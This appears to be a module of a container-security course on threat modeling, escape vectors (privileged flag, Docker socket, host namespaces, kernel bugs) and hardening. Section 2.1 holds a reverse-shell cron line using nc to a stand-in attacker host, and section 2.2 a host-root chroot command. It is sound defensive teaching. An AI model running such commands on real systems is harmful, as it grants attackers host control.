# 01 - Container Threat Modeling and Escape Vectors: What, About & Working

> **Concept:** Analyzing the shared-kernel container attack surface, identifying escape vectors, and mitigating malicious sandbox breakouts.

---

## 🎯 1. What is Container Threat Modeling?

Unlike Virtual Machines, containers do **NOT** virtualize hardware or kernel boundaries. Every container on a host shares the **exact same Linux kernel**. Container isolation is implemented purely via software kernel abstractions: **Namespaces** (visibility) and **Control Groups** (resource quotas).

A **Container Escape** occurs when an attacker inside a container bypasses these kernel boundaries and achieves execution privileges on the underlying host operating system.

```text
SHARED KERNEL ATTACK SURFACE:
┌────────────────────────┐      ┌────────────────────────┐
│  Attacker Container    │      │  Production DB Pod     │
│  (Compromised App)     │      │  (Sensitive PCI Data)  │
└───────────┬────────────┘      └───────────▲────────────┘
            │ Malicious Syscall             │
            ▼                               │ Lateral Movement
┌───────────────────────────────────────────┴────────────┐
│              SHARED LINUX HOST KERNEL                  │
│       (Vulnerable Syscall: clone / bpf / overlayfs)    │
└────────────────────────────────────────────────────────┘
```

---

## 🚨 2. The Top 5 Container Escape Vectors & How They Work

### 2.1 The `--privileged` Flag Danger
- **What it does:** Disables all namespace boundaries, drops AppArmor/Seccomp protections, grants all 40+ Linux capabilities, and mounts all host devices from `/dev` into the container.
- **Escape Vector:** An attacker mounts the host's root disk partition (`/dev/sda1`) and writes a root SSH key or malicious cron job:
  ```bash
  mkdir /host && mount /dev/sda1 /host
  echo "* * * * * root nc -e /bin/sh attacker.com 4444" >> /host/etc/crontab
  ```
- **Mitigation:** **NEVER run containers with `--privileged` in production!**

---

### 2.2 Mounted Docker Socket (`/var/run/docker.sock`)
- **What it does:** Allows a container to talk directly to the host Docker daemon API.
- **Escape Vector:** Anyone with access to the Docker socket has **effective root access to the host**. The container calls the API to spawn a sibling container with host root mounted:
  ```bash
  docker run -v /:/host -it alpine chroot /host
  ```
- **Mitigation:** Never mount `/var/run/docker.sock` into application workloads. Use Kaniko or Buildah for in-cluster image builds.

---

### 2.3 Shared Host Namespaces (`--pid=host`, `--net=host`, `--ipc=host`)
- **`--pid=host`:** Lets the container inspect, debug, and kill host processes.
- **`--net=host`:** Lets the container bind directly to host network ports, sniff localhost traffic, and spoof packets.
- **`--ipc=host`:** Lets the container read and write shared memory segments of other host applications.

---

### 2.4 Kernel Vulnerabilities (e.g. Dirty COW, CVE-2022-0847 Dirty Pipe)
- When unpatched Linux kernel flaws exist, memory corruption exploits allow unprivileged container processes to write to read-only kernel memory pages.
- **Mitigation:** Regular host kernel patching, reboot automation, and live patching (kpatch).

---

## 🛡️ 3. Defensive Hardening Checklist

| Defense Layer | Implementation | Security Benefit |
| :--- | :--- | :--- |
| **User Isolation** | `USER 10001` in Dockerfile | Runs process as non-root; prevents write access to system files. |
| **Capability Dropping** | `--cap-drop=ALL` | Blocks raw packet creation, device mounts, and tracing. |
| **Read-Only Root Filesystem** | `--read-only` | Halts payload downloads, script drops, and rootkit installs. |
| **Syscall Filtering** | Default Seccomp Profile | Blocks 300+ dangerous Linux syscalls. |
| **Resource Limits** | `-m 512m --cpus 1.5` | Prevents Fork-Bombs and CPU exhaustion attacks. |

---

| Previous | Index | Next |
| :--- | :---: | ---: |
| [← Prev Module (06-Docker-Compose-Multi-Container-Apps)](../06-Docker-Compose-Multi-Container-Apps/12-Quick-Revision.md) | [Index](../../../README.md) | [02 - Linux Capabilities and Least Privilege →](./02-Linux-Capabilities-and-Least-Privilege.md) |
